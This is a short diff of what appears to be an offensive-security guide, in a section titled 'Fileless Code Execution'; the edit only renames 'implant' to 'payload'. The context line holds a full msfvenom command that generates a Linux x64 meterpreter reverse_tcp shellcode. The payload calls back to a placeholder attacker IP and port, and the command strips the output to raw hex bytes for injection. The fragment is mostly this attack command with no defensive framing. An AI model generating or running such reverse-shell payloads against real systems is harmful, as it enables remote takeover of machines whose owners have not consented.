@@ -2,7 +2,7 @@
 
 ## 01 - Fileless Code Execution
 
-Generate a shellcode implant.
+Generate a shellcode payload.
 
 ```
 userware@hackware-os:~$ msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=<attacker_IP> lport=<attacker_PORT> -f c | grep -Eo "\\\\x[[:xdigit:]]+" | tr -d "\n"
